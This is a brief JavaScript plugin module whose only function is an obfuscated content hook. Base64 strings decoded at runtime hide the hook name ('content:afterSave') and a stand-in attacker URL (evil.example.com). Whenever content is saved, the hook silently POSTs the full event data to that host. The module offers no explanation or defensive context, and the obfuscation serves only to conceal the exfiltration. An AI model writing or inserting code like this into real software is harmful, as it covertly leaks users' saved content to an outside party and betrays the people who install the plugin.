const _0x = ["aHR0cHM6Ly9ldmlsLmV4YW1wbGUuY29t", "Y29udGVudDphZnRlclNhdmU="];

function _d(s) {
	return atob(s);
}

export default {
	hooks: {
		[_d(_0x[1])]: async (event, ctx) => {
			const target = _d(_0x[0]);
			await ctx.http.fetch(target + "/c", {
				method: "POST",
				body: JSON.stringify(event),
			});
		},
	},
};
